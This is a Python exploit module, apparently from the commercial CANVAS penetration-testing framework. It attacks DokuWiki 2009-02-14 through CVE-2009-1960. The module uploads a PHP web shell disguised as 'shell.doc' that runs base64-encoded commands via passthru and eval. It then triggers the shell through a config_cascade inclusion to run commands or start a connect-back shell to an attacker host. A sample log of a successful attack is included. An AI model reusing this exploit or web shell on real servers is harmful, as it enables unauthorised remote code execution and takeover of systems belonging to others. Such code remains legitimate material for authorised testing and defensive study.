#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2008
# http://www.immunityinc.com/CANVAS/ for more information
#

import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from ExploitTypes.php_multi import *

import libs.spkproxy as spkproxy
import canvasengine
import re
import urllib

NAME="DokuWiki 2009-02-14 Globals overwrite / Code execeution"
DESCRIPTION="DokuWiki 2009-02-14 Globals overwrite / Code execeution"
DOCUMENTATION={}
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"]="CVE-2009-1960"
DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2009-1960"
DOCUMENTATION["References"]=["www.securityfocus.com/bid/35095"]

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""
Requires REGISTER_GLOBALS = On; in php.ini

Exmample:
[ Wed May 27 16:44:05 2009 ][C] (192.168.121.133/32) Using Testfile=doku.php
[ Wed May 27 16:44:05 2009 ][C] (192.168.121.133/32) Testing hostname: 192.168.121.133
[ Wed May 27 16:44:05 2009 ][C] (192.168.121.133/32) Testing for basepath: /dokuwiki-2009-02-14/
[ Wed May 27 16:44:05 2009 ][C] (192.168.121.133/32) Found Potential vulnerable php app in vhost 192.168.121.133 at basepath /dokuwiki-2009-02-14/
[ Wed May 27 16:44:05 2009 ][C] (192.168.121.133/32) Attacking 192.168.121.133:80
[ Wed May 27 16:44:05 2009 ][C] (192.168.121.133/32) Basic Auth User: 
[ Wed May 27 16:44:05 2009 ][C] (192.168.121.133/32) VHost: 192.168.121.133
[ Wed May 27 16:44:05 2009 ][C] (192.168.121.133/32) [+] Sectok: f52b672579dbee4b25e4640e165d6d5f
[ Wed May 27 16:44:05 2009 ][C] (192.168.121.133/32) [+] uploading shell.doc..
[ Wed May 27 16:44:05 2009 ][C] (192.168.121.133/32) [+] Uploading doc
[ Wed May 27 16:44:05 2009 ][C] (192.168.121.133/32) [+] Command: ls -al
[ Wed May 27 16:44:05 2009 ][C] (192.168.121.133/32) [+] Base64_encoded Command: bHMgLWFs
[ Wed May 27 16:44:05 2009 ][C] (192.168.121.133/32) Command result: total 96
drwxrwxrwx  7 user syslog  4096 Feb 14 04:13 .
drwxrwxrwx 35 root root    4096 May 26 13:44 ..
-rwxrwxrwx  1 user syslog  1470 Feb 14 04:13 .htaccess.dist
-rwxrwxrwx  1 user syslog 17992 Feb 14 04:13 COPYING
-rwxrwxrwx  1 user syslog   240 Feb 14 04:13 README
-rwxrwxrwx  1 user syslog    11 Feb 14 04:13 VERSION
drwxrwxrwx  2 user syslog  4096 Feb 14 04:13 bin
drwxrwxrwx  2 user syslog  4096 May 26 13:45 conf
drwxrwxrwx 10 user syslog  4096 Feb 14 04:13 data
-rwxrwxrwx  1 user syslog  2206 Feb 14 04:13 doku.php
-rwxrwxrwx  1 user syslog 10676 Feb 14 04:13 feed.php
drwxrwxrwx  6 user syslog  4096 Feb 14 04:13 inc
-rwxrwxrwx  1 user syslog   185 Feb 14 04:13 index.php
-rwxrwxrwx  1 user syslog 16072 Feb 14 04:13 install.php
drwxrwxrwx  8 user syslog  4096 Feb 14 04:13 lib
Checking to see if I succeeded

"""

CHANGELOG="""
"""

class theexploit(php_multi):
    def __init__(self):
        php_multi.__init__(self)
        self.port=80
        self.host=""
        self.ssl=""
        self.basepath="/"
        self.basepaths=["/dokuwiki-2009-02-14/","/wiki/","/dokuwiki/","/"]
        self.command=None 
        self.basicauth_user=""
        self.basicauth_password=""
        self.user=""
        self.password=""
        self.hostname=None
        self.foundstrings=["2009-02-14"]
        self.testfile="VERSION"
	self.sectok = ""
	return
    
    def request1(self):	
	data = self.UA.GET("doku.php")

	# Maybe work with python regex more for this.
	p = re.compile('([a-z0-9]{32})')
        match = p.search(data)

        if not match:
            self.log("[-] No sectok found!")
            return 0
	
	# May only work on date/time rewrite rules. fix later
        self.sectok   = match.group()[-33:]
        self.log("[+] Sectok: %s"%self.sectok)
	
	return self.sectok
    
    
    def request2(self):
	self.log("[+] uploading shell.doc..")
	
	scode = """
	<?php
            error_reporting(0);
            ini_set('max_execution_time',0);
            print 'startz';
            passthru(base64_decode($_REQUEST[SERVER_INFO]));
            eval(base64_decode($_REQUEST[SERVER_INFO2]));
            print 'endz';
            exit;
	?>"""
	
        self.log("[+] Uploading doc")
        fields={}   
        fields["sectok"]=self.sectok
        fields["ns"]=""
        fields["sa"]="forumProfile"
	fields["id"]="shell.doc"
        files=[("upload", "shell.doc", scode)]
        self.UA.multipart("lib/exe/mediamanager.php", fields, files)
	
	return True
    
    def request3(self):

        if self.command:
            self.log("[+] Command: %s"%self.command)
            
            command=self.command
            command=b64encode(command)
            self.log("[+] Base64_encoded Command: %s"%command)

	    data = self.UA.GET("doku.php?config_cascade[main][default][]=./data/media/shell.doc&SERVER_INFO=%s"%(urllib.quote_plus(command)))
        
            if "startz" in data:
                result=data.split("startz")[1].split("endz")[0]
                self.log("Command result: %s"%prettyprint(result))
                ret=1
            else:
                self.log("[-] Command not run - service patched?!")
        else:
        
            command=self.get_php_to_mosdef()
            self.log("[+] Command: %s"%command)
            command=b64encode(command)
            self.log("[+] Base64_encoded Command: %s"%command)
        
            data = self.UA.GET("doku.php?config_cascade[main][default][]=./data/media/shell.doc&SERVER_INFO2=%s"%(urllib.quote_plus(command)))
        
            self.log("[+] Looking for PHP connectback")
            
            ret=self.ISucceeded()   
        
        return ret

	
    def usage(self):
	print "Example: "+sys.argv[0]+" -t 172.16.104.128 -p 80 -l 10.10.10.227 -d 9898"
	print "-t <target ip>"
	print "-p <target port>                [optional]"
	print "-O basepath: /path/to/dokuwiki/ [optional]"
	print "-O hostname: target vhost       [optional]"
	print "-O command:commandtorun         [optional]"
	print "-l call back ip if doing connect back"
	print "-d listening port for call back"
	return
	
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

